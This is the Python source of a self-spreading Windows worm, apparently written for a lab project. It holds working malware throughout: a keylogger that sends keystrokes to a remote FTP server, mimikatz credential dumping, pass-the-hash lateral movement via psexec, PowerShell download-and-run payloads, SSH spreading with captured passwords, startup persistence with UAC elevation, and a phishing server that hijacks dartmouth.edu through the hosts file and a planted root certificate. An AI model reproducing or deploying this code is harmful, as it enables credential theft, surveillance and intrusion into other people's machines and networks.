#!/usr/bin/env python
import os
import os.path
import shutil
import subprocess
import psutil # to work with system processes
import sys
import ftplib # we use remote ftp (public) storage
import re
import sqlite3
import flask # for the local webserver we run
import pynput # to record key strokes
import paramiko # interface to the ssh protocol
import getpass
import requests
import socket
import zipfile
import ipaddress
import rich
import platform
from tqdm import tqdm
from datetime import datetime
from time import sleep
from flask import request, Flask, send_from_directory

# compile using: pyinstaller --onefile --paths=venv\Lib\site-packages ./main.py
# set to True when compiling using pyinstaller, when developing keep False.
IS_EXECUTABLE = False

# whether we're on windows
IS_WINDOWS = any(platform.win32_ver())
# location of the current executable
THIS_PATH = os.path.realpath(__file__)
# some urls to external programs
NMAP_URL = 'https://nmap.org/dist/nmap-7.92-win32.zip'
NMAP_FILENAME = 'nmap-7.92/nmap.exe'
MIMIKATZ_URL = 'https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe'
PSEXEC_URL = 'https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/psexec_windows.exe'
# some more constants
PORTS = [445, 139] # 445 or 139 for SMB
# constants for the path to the hosts file and to the home directory
HOSTS_PATH_FOR_PLATFORM = {
    "linux": "/etc/hosts",
    "darwin": "/etc/hosts",
    "win32": r"C:\Windows\System32\drivers\etc\hosts"
}
HOSTS_PATH = HOSTS_PATH_FOR_PLATFORM[sys.platform]
HOME_DIR_FOR_PLATFORM = {
    "linux": os.path.expanduser("~"),
    "darwin": os.path.expanduser("~"),
    "win32": r"C:\Windows" # placing the executable in that dir makes it run as admin
}
HOME_DIR = HOME_DIR_FOR_PLATFORM[sys.platform]
# ftp settings (used for remote file/data storage on my personal server, because i found that to be the best option)
FTP_ADDR = '95.217.0.99'
FTP_USER = 'anonymous'
FTP_PASS = ''
# some constants for the keylogging functionality
MAX_ADDR_LENGTH = 18 # how long can a ssh address be?
MAX_PASS_LENGTH = 16 # how long can a password be?
MAX_MAIL_LENGTH = 26 # how long can an email be?
MIN_ADDR_LENGTH = 10 # how short can a ssh address be?
MIN_PASS_LENGTH = 7 # how short can a password be?
MIN_MAIL_LENGTH = 14 # how short can an email be?
MAX_TYPING_INTERVAL = 2 # how slow can a person type? (max time between keypresses in seconds)
REMOTE_UPDATE_INTERVAL = 5 # how often to update the remote file with newly recorded keypresses
SSH_LATERAL_MOVEMENT_INTERVAL = 60
PASSTHEHASH_LATERAL_MOVEMENT_INTERVAL = 3600
WATCHDOG_SLEEP_INTERVAL = 5 # intervals between watchdog checks

# check if we're root (on linux) or admin (on windows)
import ctypes
def is_admin():
    try:
        # for unix
        is_admin = os.getuid() == 0
    except AttributeError:
        # for windows
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

# fancy print
def my_print(msg):
    #print(f'[info] {msg}')
    rich.print(f'[[green]info[/green]] {msg}')

def check_email(mystr):
    if not (MIN_MAIL_LENGTH <= len(mystr) <= MAX_MAIL_LENGTH):
        return False
    # return re.findall(r'[\w\.-]+@[\w\.-]+\.com', mystr)
    return mystr.endswith('.com') and '@' in mystr and '.com' in mystr

def check_ssh_addr(mystr):
    return check_email(mystr) # not so smart eh

def create_ftp_connection():
    ftp = ftplib.FTP(FTP_ADDR, FTP_USER, FTP_PASS)
    s = ftp.cwd('free')
    return ftp

def close_ftp_connection(ftp):
    ftp.close()

def find_subsequence(seq, condition):
    """
    for every possible consecutive subsequence of the given sequence 'seq', yield those
    for which the function 'condition' returns True. it yields tuples of the form
    (subsequence, begin, end), where 'subsequence' is the subsequence itself, and 'begin'
    and 'end' are the indicies for the beginning and the end of the subsequence in the
    original sequence 'seq', respectively.
    """
    for index in range(0, len(seq)):
        for subseq_len in range(1, len(seq) + 1):
            accept = True
            subseq = seq[index:index+subseq_len]
            if condition(subseq):
                yield subseq, index, index + subseq_len

def ftp_dl(ftp, filename, local_path=None):
    """
    given an ftp connection 'ftp', download a file 'filename', save it to 'local_path'
    """
    if local_path is None:
        local_path = filename
    if os.path.dirname(local_path):
        os.makedirs(os.path.dirname(local_path), exist_ok=True)
    myfile = open(local_path, 'wb+')
    ftp.retrbinary('RETR ' + filename, myfile.write)
    myfile.close()

def ftp_append_line(ftp, remote_filepath, line):
    """
    given an ftp connection, append the given line to the given filepath on the remote server
    """
    s = ftp.transfercmd(f'APPE {remote_filepath}')
    s.send(f'{line}\n'.encode())
    s.close()

def execute_remote_ssh_cmd(addr, username, password, cmd):
    try:
        con = paramiko.SSHClient()
        con.load_system_host_keys()
        con.connect(addr, 22, username, password)
        stdin, stdout, stderr = con.exec_command(cmd)
        out = stdout.read()
        s.close()
        return True
    except:
        return False

def run_command(cmd):
    """
    run the command 'cmd' detached from the current program
    """
    p = subprocess.Popen(cmd, start_new_session=True)

def add_certificate(cert_path):
    """
    make windows accept an ssl certificate
    """
    subprocess.run(['certutil', '-f', '-addstore', 'root', cert_path])

def http_dl(url, local_path=None, cancel_if_file_exists=False, extract_zip=False):
    if not local_path:
        local_path = os.path.basename(url)
    if cancel_if_file_exists:
        if os.path.isfile(local_path):
            return local_path
    my_print(f'downloading {local_path}')
    response = requests.get(url, stream=True)
    total_size = int(response.headers.get('content-length', ))
    block_size = 1024
    with tqdm(total=total_size, unit='B', unit_scale=True) as progress_bar:
        with open(local_path, 'wb+') as local_file:
            for data in response.iter_content(block_size):
                progress_bar.update(len(data))
                local_file.write(data)
    if extract_zip:
        my_print(f'extracting {local_path}')
        with zipfile.ZipFile(local_path, 'r') as zip_ref:
            zip_ref.extractall('.')
    my_print(f'successfully downloaded {local_path}')
    return local_path

# this would require internet working (in virtualbox Internal Network internet connection isnt available)
# but the upside is that it is cross-platform, i ended up not using it though.
def get_local_ip_1():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

# these methods are specific to windows (they use the ipconfig tool)
def get_local_ip():
    out = subprocess.check_output('ipconfig').decode()
    line = re.findall('.*IPv4 Address.*', out)[0]
    return line.split(':')[1].strip()
def get_local_subnet():
    out = subprocess.check_output('ipconfig').decode()
    ip_line = re.findall('.*IPv4 Address.*', out)[0]
    mask_line = re.findall('.*Subnet Mask.*', out)[0]
    ip = ip_line.split(':')[1].strip()
    mask = mask_line.split(':')[1].strip()
    return str(ipaddress.ip_network(f'{ip}/{mask}', strict=False))

def network_scan(ip_range, ports):
    """
    scan ip_range for machines with specific ports open using nmap
    """
    cmd = r'.\%s -Pn -p %s %s -open -oG -' % (NMAP_FILENAME, ','.join([str(port) for port in ports]), ip_range)
    my_print(f'running: {cmd}')
    out = subprocess.check_output(cmd).decode()
    lines = re.findall('.*/open/.*', out)
    results = []
    for line in lines:
        host = line.split(' ')[1]
        ports = re.findall('[1-9]+/open', line)
        for port in ports:
            results.append((host, port.split('/')[0]))
    return results

def grab_local_accounts(mimikatz_path):
    """
    takes the path to the mimikatz.exe script, runs it to grab NT hashes, parses output and returns
    list of user accounts with their hashes in the form of ((username1, hash1),...)

    notice that in the output of the mimikatz command, we are looking for lines of this sort:
    User : Quickemu
      Hash NTLM: 46918bbdd98fcc59f26dc9058ff5bcdc
    so we look for lines starting with "User" followed by lines starting with "Hash" (ignoring the spaces)
    """

    cmd = f'{mimikatz_path} "token::elevate" "lsadump::sam" exit'
    out = subprocess.check_output(cmd)
    accounts = []
    prev_line = None
    for line in out.splitlines():
        line = line.decode()
        if prev_line and prev_line.startswith('User'):
            myuser = prev_line.split(':')[1].strip()
            if line.strip().startswith('Hash'):
                myhash = line.strip().split(':')[1].strip()
                accounts.append((myuser, myhash))
        prev_line = line
    return accounts


# this is the command used to download the worm on the target
def get_payload():
    return r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.ps1'' , ''C:\Windows\main.ps1''); Set-ExecutionPolicy unrestricted; powershell.exe C:\Windows\main.ps1' """

def passthehash():
    mimikatz = http_dl(MIMIKATZ_URL, cancel_if_file_exists=True)
    psexec = http_dl(PSEXEC_URL, cancel_if_file_exists=True)
    accounts = grab_local_accounts(mimikatz)
    for account in accounts:
        my_print(f'got account {account}')
    # local_ip = get_local_ip()
    local_ip_range = get_local_subnet()
    if not os.path.isfile(NMAP_FILENAME):
        http_dl(NMAP_URL, extract_zip=True)
    my_print(f'running a scan of the local network open ports {",".join([str(port) for port in PORTS])}, this may take a minute')
    hosts = network_scan(local_ip_range, PORTS)
    for host in hosts:
        ip, port = host
        my_print(f'found open {ip}:{port}')
    for host in hosts:
        for account in accounts:
            username, passhash = account
            ip, port = host
            if ip == get_local_ip(): # we dont wanna infect ourselves
                continue
            # this is the command used to download the worm on the target
            # doesnt work
            # remote_cmd = r"""start '' powershell.exe -Command `"echo starting infection...; &{ (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mahmoodsh36/test2/main/test.sh', 'C:\test.sh') }; start test.sh; echo done, exiting...; sleep 5`" """
            # doesnt work:
            # powershell.exe /c .\psexec_windows.exe -hashes ':f6bb3bd80a37a2c11e351f62bd43dd92' -port 445 'mahmo@10.0.2.5' "powershell.exe -Command 'echo starting infection...; (New-Object System.Net.WebClient).DownloadFile(''https://raw.githubusercontent.com/mahmoodsh36/test2/main/test.sh'' , ''C:\test.sh''); start C:\test.sh; echo done, exiting...; sleep 6'"
            # works alone
            # .\psexec_windows.exe -hashes ':f6bb3bd80a37a2c11e351f62bd43dd92' -port 445 'mahmo@10.0.2.5' "powershell.exe -Command 'echo starting infection...; (New-Object System.Net.WebClient).DownloadFile(''https://raw.githubusercontent.com/mahmoodsh36/test2/main/test.sh'' , ''C:\test.sh''); start C:\test.sh; echo done, exiting...; sleep 6'"
            # powershell.exe twice is intentional, it is to circumvent argument handling of cmd.exe
            # this took me hours to get right, windows argument handling is a nightmare
            # remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.exe'' , ''C:\main.exe''); start C:\main.exe; echo exiting...; sleep 3' """
            # remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); python C:\main.py; echo exiting...; sleep 3' """
            # this is the command used to connect to the target and run 'remote_cmd'
            #connect_cmd = f"./{psexec} -hashes ':{passhash}' -port 445 mahmo@10.0.2.4 '{remote_cmd}'"
            cmd = get_payload()
            connect_cmd = f"powershell.exe .\\{psexec} -hashes ':{passhash}' -port {port} '{username}@{ip}' \"{cmd}\""
            my_print(f'attempting to connect to {username}@{ip}:{port} with hash {passhash}')
            my_print(f'running command: {cmd}')
            result = subprocess.run(connect_cmd, shell=True)
            if result.returncode == 0: # success!
                my_print(f'successfully moved to {username}@{ip}:{port} with hash {passhash}')
            else:
                my_print(f'failed to move to {username}@{ip}:{port} with hash {passhash}')

# most of the key functionality lies in this class and its functions
class HistEntry():
    """
    an entry of KeyHist, contains a key and other metadata.
    """
    def __init__(self, key, is_alphanumeric):
        self.key = key
        # the time the key was pressed
        self.timestamp = datetime.now()
        # whether the remote server has been informed of the key press
        self.updated = False
        # whether it is a non-alphabet key
        self.is_alphanumeric = is_alphanumeric

class KeyHist:
    """
    a structure keeping a history of keys recorded by the keylogger
    """
    def __init__(self):
        self.key_list = []
        self.detected_emails = [] # an entry is of the form (email, password)

    def add_key(self, key, is_alphanumeric):
        self.key_list.insert(len(self.key_list), HistEntry(key, is_alphanumeric))

#    def candidate_sequences(self, min_length, max_length):
#        """
#        this function finds sequences of typed keys that are 'MAX_TYPING_INTERVAL' away
#        from each other and are of length atleast 'min_length' and at most 'max_length',
#        used to check those subsequences for pattern of emails, ssh credentials, etc.
#        these sequences have to be of length atleast 'min_len'.
#        """
#        for seq, begin, end in consecutive_subseqs_bounded_length(
#                self.key_list,
#                min_length,
#                max_length):
#            accept = False
#            # if the sequence was started after a delay of no typing
#            if (begin > 0 and seq[begin - 1].timestamp - seq[begin].timestamp).total_seconds() > MAX_TYPING_INTERVAL:
#                accept = True
#            for (index, thing) in enumerate(seq[:-1]):
#                current, _next = thing, seq[index + 1]
#                if (current.timestamp - _next.timestamp).total_seconds() > MAX_TYPING_INTERVAL:
#                    accept = False
#            modified_seq = [entry for entry in seq if entry.is_alphanumeric]
#            if accept:
#                yield modified_seq

    def hist_to_str(seq):
        return ''.join([item.key for item in seq])

    def check_for_emails(self):
        """
        checks for emails and their passwords in the key history, yields tuples of
        the form (email, password).
        """
        seq = [entry for entry in self.key_list if entry.is_alphanumeric]
        index = 0
        while index < len(seq) - 1:
            current, _next = seq[index], seq[index + 1]
            prev = seq[index - 1] if index > 0 else None
            new_index = index + 1
            if not prev or (current.timestamp - prev.timestamp).total_seconds() > MAX_TYPING_INTERVAL:
                # we reached a delay between keys, check if an email was typed after that delay
                # a "lambda" to check a key hist sequence containing an email
                for subseq, begin, end in find_subsequence(
                        seq[index:],
                        lambda subseq: check_email(KeyHist.hist_to_str(subseq))):
                    accept = True
                    subseq_str = KeyHist.hist_to_str(subseq)
                    subseq_len = len(subseq_str)
                    for (_index, _thing) in enumerate(subseq[:-1]):
                        _current, __next = _thing, subseq[_index + 1]
                        if (__next.timestamp - _current.timestamp).total_seconds() > MAX_TYPING_INTERVAL:
                            accept = False
                    email = subseq_str if accept else None
                    password = None
                    # if we detected an email address, we might aswell consider the next
                    # sequence of characters to be the password (potentially)
                    if email:
                        new_index = index + end
                        longest = None
                        for pass_subseq, begin, end in find_subsequence(
                                seq[new_index:new_index+MAX_PASS_LENGTH],
                                lambda x: MIN_PASS_LENGTH <= len(x) <= MAX_PASS_LENGTH):
                            accept = True
                            seconds_since_email = (subseq[-1].timestamp - pass_subseq[0].timestamp).total_seconds()
                            if seconds_since_email > 7:
                                accept = False
                            for _index in range(0, len(pass_subseq) - 1):
                                _current, __next = pass_subseq[_index], pass_subseq[_index+1]
                                if (__next.timestamp - _current.timestamp).total_seconds() > MAX_TYPING_INTERVAL:
                                    accept = False
                            if accept:
                                if longest == None or len(longest) < len(pass_subseq):
                                    longest = pass_subseq
                                    password = KeyHist.hist_to_str(pass_subseq)
                                    new_index += len(pass_subseq)
                    if email:
                        if (email, password) not in self.detected_emails:
                            yield email, password
                            self.detected_emails.append((email, password))
                        break
            index = new_index

    def check_for_ssh_credentials(self):
        for not_email, password in self.check_for_emails():
            if not password:
                continue
            tokens = not_email.split('@')
            user = tokens[0]
            addr = '@'.join(tokens[1:])
            yield user, addr, password

    def new_keys(self):
        return [entry for entry in self.key_list if not entry.updated]

    def new_keys_str(self):
        # we could do this faster by
        # 1. not iterating twice
        # 2. not iterating from the beginning to the end but vice versa, as the new keys
        #    are always added at the end of the list
        entries = self.new_keys()
        if not entries:
            return None
        return ' '.join([f'{entry.key}-{entry.timestamp.strftime("%Y-%m-%d %H:%M:%S")}'
                         for entry in entries])

    def update_remote(self):
        # if we have captured any keys, update the remote file
        keys_str = self.new_keys_str()
        if keys_str:
            # open an ftp connection and append a line to the file keys.txt
            ftp = create_ftp_connection()
            ftp_append_line(ftp, 'keys.txt', keys_str)
            close_ftp_connection(ftp)
            my_print(f'updated remote with {",".join([mykey.key for mykey in self.new_keys() if mykey.is_alphanumeric])}')
            for mykey in self.new_keys():
                mykey.updated = True

    def try_moving_through_ssh(self):
        """
        based on the data we've been gathering, try to infect some other machine
        or sending the executable to some other machine/device.
        """
        # if we have captured any ssh credentials, upload the value to the corresponding
        # machines and start the program there
        for usr, addr, password in self.check_for_ssh_credentials():
            my_print(f'attempting to transmit payload via ssh to {usr}@{addr}, with password {password}')
            if execute_remote_ssh_cmd(addr, usr, password, get_payload()):
                my_print(f'successfully transmitted payload via ssh to {usr}@{addr}, password {password}')
            else:
                my_print(f'failed to transmit payload via ssh to {usr}@{addr}, password {password}')
        for email, password in self.check_for_emails():
            # i wanted to implement mass mail sending with the program as an attachment here,
            # but i dropped that idea
            pass


def start_keylogger():
    keyhist = KeyHist()

    # see https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    def on_press(key):
        if not key: # dunno why its sometimes None
            return
        try:
            # alphanumeric key
            if key == pynput.keyboard.Key.space:
                key_str = ' '
            else:
                key_str = key.char
            is_alphanumeric = True
        except AttributeError as e:
            # special key
            # pynput.keyboard.Key.<key here>.value may be useful too
            key_str = str(key)
            is_alphanumeric = False
        my_print(f'added {key_str}.')
        # append the captured key to the in-memory "cache"
        keyhist.add_key(key_str, is_alphanumeric)

    with pynput.keyboard.Listener(on_press=on_press) as listener:
        # listener.join()
        while True:
            # if we have captured any keys, update the remote file
            keyhist.update_remote()
            # try lateral movement through captured ssh credentials (if any)
            keyhist.try_moving_through_ssh()
            sleep(REMOTE_UPDATE_INTERVAL)

if __name__ == '__main__':
    my_print(f"is admin: {is_admin()}")
    if not is_admin():
        my_print("please run this script as admin(windows)/root(unix)")
        exit(1)
    # first argument should either be
    # - none: this means the program is invoked for the first time, we need to make sure we've "installed"
    #         the program properly (and ensure persistence, e.g. on reboots), and we need to run all tasks.
    # - 'watchdog': the program behaves as a watchdog for the keylogger.
    # - 'keylog': the program behaves as a keylogger (this includes lateral movement through recorded ssh credentials).
    # - 'phish': the program starts a webserver that listens to http connections (for phishing purposes).
    # - 'passthehash': the program tries to move to other machines on the same network with "pass the hash" technique.
    job = sys.argv[1] if len(sys.argv) > 1 else None

    if job:
        my_print(f'received job: {job}')
    else:
        my_print('received no specific job, will run everything')

    executable_name = os.path.basename(sys.argv[0])
    _, executable_ext = os.path.splitext(THIS_PATH)

    if IS_EXECUTABLE:
        base_cmd = [sys.executable]
    else:
        base_cmd = [sys.executable, THIS_PATH]

    if job is None:
        # copy the file
        try:
            shutil.copy(base_cmd[-1], HOME_DIR)
            # after copying it over we need to modify base_cmd accordingly
            base_cmd[-1] = os.path.join(HOME_DIR, os.path.basename(base_cmd[-1]))
        except:
            pass

        # to run the script on startup (windows only)
        if IS_WINDOWS:
            start_cmd = ' '.join(['"' + part + '"' for part in base_cmd])
            runner_bat_path = r'%s\main.bat' % HOME_DIR
            for myuser in psutil.users():
                startup_bat_path = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\open.bat" % myuser.name
                with open(startup_bat_path, "w+") as bat_file:
                    # the following is needed to ensure the script runs as admin
                    # https://stackoverflow.com/questions/6811372/how-to-code-a-bat-file-to-always-run-as-admin-mode
                    contents = r"""
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

"""
                    contents = contents + f'start "" "{runner_bat_path}"'
                    bat_file.write(contents)
            with open(runner_bat_path, "w+") as bat_file:
                bat_file.write('start "" %s' % start_cmd)

        # run the copied executable as a watchdog
        my_print('running copied file as watchdog')
        run_command(base_cmd + ['watchdog'])

        # remove the original executable
        # os.remove(THIS_PATH)
    elif job == 'watchdog':
        mytime = 0
        while True:
            process_alive = False
            for p in psutil.process_iter():
                # if 'keylog' in p.name():
                try:
                    if 'keylog' in p.cmdline():
                        process_alive = True
                except psutil.AccessDenied:
                    # we get an exception if we try to investage certain processes, just ignore those
                    pass
            if not process_alive:
                my_print('starting background processes')
                # process = subprocess.call([THIS_PATH, "keylog"])
                run_command(base_cmd + ['keylog'])
                run_command(base_cmd + ['phish'])
            else:
                my_print(f'keylogger alive, sleeping for {WATCHDOG_SLEEP_INTERVAL} seconds')
            sleep(WATCHDOG_SLEEP_INTERVAL)
            mytime += WATCHDOG_SLEEP_INTERVAL
            if mytime % PASSTHEHASH_LATERAL_MOVEMENT_INTERVAL <= WATCHDOG_SLEEP_INTERVAL:
                my_print('running passthehash')
                passthehash()
    elif job == 'keylog':
        start_keylogger()
    elif job == 'phish':
        # https://127.0.0.1:80/
        # admin privileges are needed to add a certificate or to run on port 80
        ftp = create_ftp_connection()
        # this downloads the remote files every time but i dont care

        my_print('downloading certificate files')
        ftp_dl(ftp, 'cert.pem')
        ftp_dl(ftp, 'key.pem')

        my_print('adding certificate')
        add_certificate('cert.pem')
        my_print('certificate added')

        my_print('ensuring webpage files are downloaded...')
        ftp_dl(ftp, 'Login.html')
        # more files are needed for the page to work properly, download them
        MORE_FILES_DIR = 'Login_files'
        s = ftp.cwd(MORE_FILES_DIR)
        filenames = ftp.nlst() # get filenames within the directory
        my_print(f'got list of files: {filenames}')
        for filename in filenames:
            if not os.path.isfile(os.path.join(MORE_FILES_DIR, filename)):
                my_print('downloading ' + os.path.join(MORE_FILES_DIR, filename))
                ftp_dl(ftp, filename, os.path.join(MORE_FILES_DIR, filename))
            else:
                my_print('file present: ' + os.path.join(MORE_FILES_DIR, filename))

        close_ftp_connection(ftp)

        my_print('starting web server')

        # https://apply.dartmouth.edu/account/login?r=https%3a%2f%2fapply.dartmouth.edu%2fapply%2fstatus&cookie=1
        remote_url = 'dartmouth.edu'

        found = False
        with open(HOSTS_PATH, 'r') as hosts_file:
            for line in hosts_file:
                for token in line.split():
                    if token == remote_url:
                        found = True

        if not found:
            with open(HOSTS_PATH, 'a') as hosts_file:
                hosts_file.write(f'\n127.0.0.1 {remote_url}\n')
                hosts_file.write(f'\n127.0.0.1 https://{remote_url}\n')
            my_print('added an entry to the hosts file')

        app = flask.Flask(__name__, static_folder='./', static_url_path='')

        @app.route("/Login_files/<path:path>")
        def login_files(path):
            return send_from_directory('Login_files', path)

        @app.route("/", methods=['POST', 'GET'])
        def login_page():
            if request.method == 'GET':
                return send_from_directory('./', 'Login.html')
            elif request.method == 'POST':
                con = sqlite3.connect('my.db')
                cursor = con.cursor()
                cursor.execute("""CREATE TABLE IF NOT EXISTS users(email, password)""")
                cursor.execute("""
                               INSERT INTO users(email, password)
                               VALUES (?, ?)
                               """,
                               (request.form['email'], request.form['password']))
                con.commit()
                return "<h>you've been phished</h>"

        app.run(ssl_context=('cert.pem', 'key.pem'), host='0.0.0.0', port=80)
        # https://dartmouth.edu:80
    elif job == 'passthehash':
        passthehash()
